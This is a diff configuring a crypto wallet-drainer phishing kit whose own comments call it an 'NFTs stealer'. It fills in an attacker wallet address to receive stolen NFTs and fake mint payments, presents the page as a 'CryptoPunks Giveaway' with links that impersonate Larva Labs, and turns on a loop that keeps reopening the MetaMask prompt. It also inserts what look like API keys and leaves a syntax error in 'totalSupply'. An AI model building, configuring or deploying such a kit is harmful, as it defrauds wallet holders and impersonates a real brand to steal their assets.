@@ -1,32 +1,32 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "YOUR WALLET";    // Your ETH wallet that you have to receive NFTs
-const infuraId = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"    // Web3 Api key | https://moralis.io/ | For NFTs
+const address = "0x910d7A1FE08C91B6c5a489f1d29F973D4392496C";    // Your ETH wallet that you have to receive NFTs
+const infuraId = "2D1Ga9cGGCpJZQ9R5J0ZP4WyaHg"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "b05e5f76c65c485facb9ff34290d8624"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "Tec.sellix.io",
-    title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    date: "10.07.2022", // Today date
+    name: "CryptoPunks",
+    title: "CryptoPunks Giveaway", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    date: "07.08.22", // Today date
     socialMedia: {
-        discord: "https://discord.gg/example",
-        twitter: "https://twitter.com/example",
+        discord: "https://discord.gg/tQp4pSE",
+        twitter: "https://www.twitter.com/larvalabs",
     },
     medias: {
-        preview: "preview.gif",
+        preview: "https://binancecryptopunks.co/wp-content/uploads/2021/02/binancecryptopunks.gif",
         favicon: "logo.png",
     },
     background: {
         type: "image",              // Supported types: image, video, color
-        image: "background.jpg",    // Image for image type, video preview for video type
+        image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRwfoOQpkgC7NilKPVWMFs9YSO2UqgCBHPqUQ&usqp=CAU",    // Image for image type, video preview for video type
         video: "background.mp4",    // If you don't use video, you can ignore this line
         color: "#4E4E6D",           // If you don't use color, you can ignore this line
     }
 }
 const mintInfo = {
-    price: 0.2,         // Price per NFT.
-    totalSupply: 999,   // Total supply of NFTs.
+    price: 0.1,         // Price per NFT.
+    totalSupply: 10,000,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
-    maxUnits: 6,        // Max units to buy.
+    maxUnits: 10,        // Max units to buy.
     askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
 }
 
@@ -34,7 +34,7 @@ const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
-    receiveAddress: "" // leave empty if you want to use the same address 
+    receiveAddress: "0x910d7A1FE08C91B6c5a489f1d29F973D4392496C" // leave empty if you want to use the same address 
 }
 
 /* 
